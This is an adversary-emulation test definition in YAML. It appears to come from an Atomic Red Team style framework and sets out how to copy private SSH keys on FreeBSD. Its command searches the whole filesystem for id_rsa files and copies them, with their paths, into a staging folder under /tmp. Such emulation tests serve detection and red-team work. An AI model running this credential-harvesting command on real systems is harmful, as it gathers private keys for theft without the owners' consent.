- description: 'Copy private SSH keys on a FreeBSD system to a staging folder using
    the `cp` command.

    '
  id: cc0bcc0f-5174-3819-f1a8-8c579596cfb9
  name: Copy Private SSH Keys with CP (freebsd)
  platforms:
    linux:
      sh:
        cleanup: rm -rf /tmp/art-staging
        command: 'if [ ! -x "$(command -v gcp)" ]; then (which pkg && pkg install
          -y coreutils); fi;  ;  mkdir /tmp/art-staging; find / -name id_rsa 2>/dev/null
          -exec gcp --parents {} /tmp/art-staging \; '
        payloads: []
